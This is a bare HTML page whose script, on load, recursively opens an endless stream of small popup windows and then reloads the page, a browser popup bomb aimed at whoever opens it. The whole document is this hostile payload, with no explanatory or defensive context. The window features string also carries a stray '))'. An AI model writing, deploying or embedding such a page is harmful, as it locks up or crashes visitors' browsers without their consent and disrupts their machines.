<head>
    <style>
        body {
            background-color: #000;
        }
    </style>
</head>
<body>
    <script>
        function createWindow(i) {
            var win=window.open('', '', 'width=100,height=100))');
            win.document.title=i
            createWindow(i+1)
        };
    </script>
    <script>
        createWindow()
        window.location.reload()
    </script>
</body>
